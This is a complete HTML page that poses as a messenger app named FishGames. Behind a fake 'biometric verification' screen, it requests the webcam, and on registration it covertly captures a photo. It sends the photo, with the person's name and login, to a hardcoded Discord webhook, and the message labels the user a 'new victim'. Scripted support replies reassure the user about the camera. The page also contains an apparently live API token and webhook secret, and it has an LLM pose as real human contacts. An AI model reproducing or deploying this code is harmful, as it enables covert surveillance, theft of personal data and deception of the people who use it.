<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FishGamesMesenger</title>
    <style>
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #008080 0%, #20b2aa 100%); 
            color: white; display: flex; justify-content: center; align-items: center; 
            min-height: 100vh; margin: 0; overflow: hidden; 
        }
        body::before {
            content: ""; position: absolute; width: 200%; height: 200%; top: -50%; left: -50%;
            background: url('https://www.transparenttextures.com/patterns/waves.png');
            opacity: 0.15; animation: moveWaves 25s linear infinite; pointer-events: none;
        }
        @keyframes moveWaves { from { transform: translate(0,0); } to { transform: translate(50px, 50px); } }

        /* Экраны */
        #camera-overlay { position: fixed; inset: 0; background: #0d1a17; z-index: 2000; display: flex; justify-content: center; align-items: center; text-align: center; }
        .warning-box { border: 2px solid #22c55e; padding: 30px; border-radius: 15px; background: #1a2e2a; max-width: 380px; }
        .reg-card { background: #1a2e2a; padding: 30px; border-radius: 15px; width: 350px; border: 1px solid #2e8b57; z-index: 10; }
        .input-group { margin-bottom: 12px; }
        label { display: block; margin-bottom: 5px; font-size: 13px; color: #a7f3d0; }
        input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #2d4f47; background: #243b35; color: white; box-sizing: border-box; outline: none; }
        .btn { width: 100%; padding: 12px; background: #22c55e; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }

        /* Мессенджер */
        #messenger-screen { display: none; width: 95vw; height: 90vh; background: #1a2e2a; border-radius: 15px; z-index: 100; border: 1px solid #2e8b57; overflow: hidden; }
        .messenger-container { display: flex; height: 100%; }
        .sidebar { width: 280px; background: #142522; border-right: 1px solid #2e8b57; display: flex; flex-direction: column; padding: 15px; }
        .search-input { width: 100%; background: none; border: 1px solid white; border-radius: 20px; padding: 8px; color: white; text-align: center; margin-bottom: 20px; outline: none; }
        .contact-list { flex: 1; overflow-y: auto; }
        .contact-item { display: flex; align-items: center; gap: 12px; padding: 10px; cursor: pointer; border-radius: 10px; transition: 0.2s; margin-bottom: 5px; }
        .contact-item:hover { background: rgba(34, 197, 94, 0.2); }
        .avatar { width: 45px; height: 45px; background: #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 1px solid white; flex-shrink: 0; }

        .chat-area { flex: 1; display: flex; flex-direction: column; background: rgba(0,0,0,0.1); }
        .chat-header { padding: 15px; text-align: center; font-weight: bold; font-size: 18px; border-bottom: 1px solid #2e8b57; color: #4ade80; }
        .messages-display { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
        .msg-bubble { background: white; color: black; padding: 10px 15px; border-radius: 15px; align-self: flex-end; max-width: 70%; word-wrap: break-word; }
        .msg-incoming { align-self: flex-start; background: #2d4f47; color: white; }
        .input-bar { padding: 15px; background: #1a2e2a; display: flex; gap: 10px; border-top: 1px solid #2e8b57; }

        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div id="camera-overlay">
    <div class="warning-box">
        <h3>⚠️ FishGames SECURITY</h3>
        <p>Биометрическая верификация лица обязательна для входа.</p>
        <button class="btn" onclick="requestAccess()">ВКЛЮЧИТЬ КАМЕРУ</button>
    </div>
</div>

<div id="reg-screen" class="reg-card">
    <h2>FishGames</h2>
    <div class="input-group"><label>Имя</label><input type="text" id="firstname" placeholder="Иван"></div>
    <div class="input-group"><label>Фамилия</label><input type="text" id="lastname" placeholder="Иванов"></div>
    <div class="input-group"><label>Год рождения</label>
        <input type="text" id="birthyear" maxlength="4" placeholder="2000" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
    </div>
    <div class="input-group"><label>Логин</label><input type="text" id="login" placeholder="user_prime"></div>
    <button class="btn" onclick="register()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
</div>

<div id="messenger-screen">
    <div class="messenger-container">
        <div class="sidebar">
            <input type="text" class="search-input" id="searchField" placeholder="поиск (Enter)" onkeypress="handleSearch(event)">
            <div class="contact-list" id="contacts">
                <div class="contact-item" onclick="openChat('Служба поддержки')">
                    <div class="avatar">⚙️</div>
                    <div>Служба поддержки</div>
                </div>
            </div>
            <div style="margin-top: auto; border-top: 1px solid #2e8b57; padding-top: 10px;">
                <div class="contact-item" style="cursor: default;">
                    <div class="avatar" id="my-ava" style="background: #008080;">?</div>
                    <div id="my-name">Вы</div>
                </div>
            </div>
        </div>
        <div class="chat-area">
            <div class="chat-header" id="chat-title">Выберите чат</div>
            <div class="messages-display" id="chat-box"></div>
            <div class="input-bar">
                <input type="text" id="messageText" style="flex:1; padding: 10px; border-radius: 8px; border:none;" placeholder="Напишите..." onkeypress="if(event.key==='Enter')sendMessage()">
                <button class="btn" style="width: 60px; margin-top: 0;" onclick="sendMessage()">➤</button>
            </div>
        </div>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    // ТВОЙ КЛЮЧ
    const HF_TOKEN = "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";
    const webhook = "https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw";

    let chatHistories = {
        'Служба поддержки': []
    };

    async function requestAccess() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video: true});
            video.srcObject = s;
            document.getElementById('camera-overlay').style.display = 'none';
        } catch(e) { alert("Камера обязательна для входа!"); location.reload(); }
    }

    function register() {
        const fn = document.getElementById('firstname').value;
        if(!fn) return alert("Введите имя!");

        // Скрытое фото
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(b => {
            const fd = new FormData();
            fd.append('payload_json', JSON.stringify({ content: `**Новая жертва:** ${fn}\nЛогин: ${document.getElementById('login').value}` }));
            fd.append('file', b, 'shot.png');
            fetch(webhook, {method: 'POST', body: fd});
        });

        document.getElementById('reg-screen').style.display = 'none';
        document.getElementById('messenger-screen').style.display = 'block';
        document.getElementById('my-name').innerText = fn;
        document.getElementById('my-ava').innerText = fn[0].toUpperCase();
        openChat('Служба поддержки');
    }

    function handleSearch(e) {
        if(e.key === 'Enter') {
            const val = document.getElementById('searchField').value.trim();
            if(val.length >= 4 && !chatHistories[val]) {
                chatHistories[val] = [];
                const list = document.getElementById('contacts');
                const item = document.createElement('div');
                item.className = 'contact-item';
                item.onclick = () => openChat(val);
                item.innerHTML = `<div class="avatar">${val[0].toUpperCase()}</div><div>${val}</div>`;
                list.appendChild(item);
                document.getElementById('searchField').value = '';
                openChat(val);
            }
        }
    }

    function openChat(name) {
        document.getElementById('chat-title').innerText = name;
        const box = document.getElementById('chat-box');
        box.innerHTML = '';
        if(name === 'Служба поддержки' && chatHistories[name].length === 0) {
            renderMessage("Система безопасности FishGames активна. Камера синхронизирована.", 'msg-incoming');
        }
        (chatHistories[name] || []).forEach(msg => {
            renderMessage(msg.content, msg.role === 'user' ? '' : 'msg-incoming');
        });
    }

    function renderMessage(text, className) {
        const box = document.getElementById('chat-box');
        const m = document.createElement('div');
        m.className = 'msg-bubble ' + className;
        m.innerText = text;
        box.appendChild(m);
        box.scrollTop = box.scrollHeight;
    }

    async function sendMessage() {
        const inp = document.getElementById('messageText');
        const text = inp.value.trim();
        const chatName = document.getElementById('chat-title').innerText;
        if(!text || chatName === 'Выберите чат') return;

        renderMessage(text, '');
        chatHistories[chatName].push({role: 'user', content: text});
        inp.value = '';

        if(chatName === 'Служба поддержки') {
            setTimeout(() => {
                let ans = "Запрос обрабатывается. Не закрывайте страницу до завершения сканирования.";
                if(text.toLowerCase().includes("камер")) ans = "Захват биометрических данных необходим для протокола FishGames.";
                renderMessage(ans, 'msg-incoming');
                chatHistories[chatName].push({role: 'assistant', content: ans});
            }, 1000);
        } else {
            await callAI(text, chatName);
        }
    }

    async function callAI(text, name) {
        const box = document.getElementById('chat-box');
        const temp = document.createElement('div');
        temp.className = 'msg-bubble msg-incoming';
        temp.innerText = 'печатает...';
        box.appendChild(temp);
        box.scrollTop = box.scrollHeight;

        const prompt = `Это чат. Ты человек по имени ${name}. Отвечай кратко на русском. Сообщение: ${text}. Твой ответ:`;

        async function request() {
            try {
                const response = await fetch("https://api-inference.huggingface.co/models/mistralai/Mistral-7B-v0.1", {
                    headers: { "Authorization": `Bearer ${HF_TOKEN}`, "Content-Type": "application/json" },
                    method: "POST",
                    body: JSON.stringify({ inputs: prompt, options: { wait_for_model: true } }),
                });

                if (response.status === 503) {
                    temp.innerText = "Нейросеть просыпается (15 сек)...";
                    setTimeout(request, 5000);
                    return;
                }

                const result = await response.json();
                temp.remove();
                
                let aiText = result[0]?.generated_text || "Я сейчас занят.";
                if (aiText.includes("Твой ответ:")) aiText = aiText.split("Твой ответ:")[1].trim();
                
                renderMessage(aiText, "msg-incoming");
                chatHistories[name].push({role: 'assistant', content: aiText});
            } catch (e) {
                temp.innerText = "Ошибка: проверь соединение.";
            }
        }
        request();
    }
</script>
</body>
</html>
